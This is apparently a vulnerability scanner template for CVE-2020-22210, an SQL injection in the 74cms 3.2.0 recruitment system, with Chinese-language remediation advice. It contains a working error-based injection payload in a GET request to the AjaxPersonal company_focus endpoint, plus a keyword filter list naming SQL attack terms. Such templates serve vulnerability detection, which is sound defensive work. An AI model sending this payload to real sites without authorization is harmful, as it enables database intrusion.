id: CVE-2020-22210
info:
  name: 74cms Sql Injection
  author:
  - l0ne1y
  description: |-
    迅易科技 74cms SQL注入漏洞
    迅易科技 74cms是广州迅易科技有限公司的一套基于PHP和MySQL的在线招聘系统。

    74cms 3.2.0 存在SQL注入漏洞，该漏洞源于officebuilding.php的x参数注入。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/blindkey/cve_like/issues/11

    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: word
    part: body
    words:
    - e807f1fcf82d132f9bb018ca6738a19f
  path:
  - '{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")
    and extractvalue(1,concat(0x7e,md5(1234567890))) -- a'
  method: GET
